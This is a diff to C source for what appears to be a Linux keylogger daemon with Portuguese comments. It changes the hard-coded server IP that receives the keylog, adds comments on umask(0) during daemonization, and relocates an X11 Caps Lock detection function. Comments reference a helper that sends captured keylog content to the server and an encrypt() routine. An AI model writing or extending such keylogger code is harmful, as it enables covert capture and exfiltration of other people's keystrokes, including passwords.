@@ -30,7 +30,7 @@
 volatile sig_atomic_t stop = 0;
 
 #define PORT 65535
-#define SERVER "192.168.0.123"
+#define SERVER "192.168.18.36"
 #define BUFF_SIZE 1024
 
 //Função auxiliar para manipulação de sinal (utilizado para finalizar o daemon)
@@ -58,6 +58,9 @@ void daemonize() {
     }
 
     // A partir daqui, estamos no processo filho (daemon)
+
+    // Usamos umask(0) para que o daemon possa ter a permissão
+    // máxima possível na criação de arquivos e diretórios
     umask(0);
 
     // Cria uma nova sessão para se desvincular do terminal de controle
@@ -70,21 +73,6 @@ void daemonize() {
     if ((chdir("/")) < 0) {
         exit(EXIT_FAILURE);
     }
-}
-
-// Função auxiliar para detectar o estado do Caps Lock
-int is_capslock_active(){
-    Display *d = XOpenDisplay(NULL);
-    if (d == NULL) {
-        fprintf(stderr, "Erro ao abrir display X\n");
-        exit(EXIT_FAILURE);
-    }
-    XkbStateRec xkbState;
-    XkbGetState(d, XkbUseCoreKbd, &xkbState);
-    int capslock = (xkbState.locked_mods & LockMask) != 0;
-    XCloseDisplay(d);
-    printf("tecla capslock está %d\n", capslock);
-    return capslock;
 }
 
 //Função auxiliar para mandar o conteúdo do keylog para o servidor
@@ -160,6 +148,21 @@ void encrypt() {
     }
     fclose(fin);
     fclose(fout);
+}
+
+// Função auxiliar para detectar o estado do Caps Lock
+int is_capslock_active(){
+    Display *d = XOpenDisplay(NULL);
+    if (d == NULL) {
+        fprintf(stderr, "Erro ao abrir display X\n");
+        exit(EXIT_FAILURE);
+    }
+    XkbStateRec xkbState;
+    XkbGetState(d, XkbUseCoreKbd, &xkbState);
+    int capslock = (xkbState.locked_mods & LockMask) != 0;
+    XCloseDisplay(d);
+    printf("tecla capslock está %d\n", capslock);
+    return capslock;
 }
 
 int main(int argc, char **argv) {
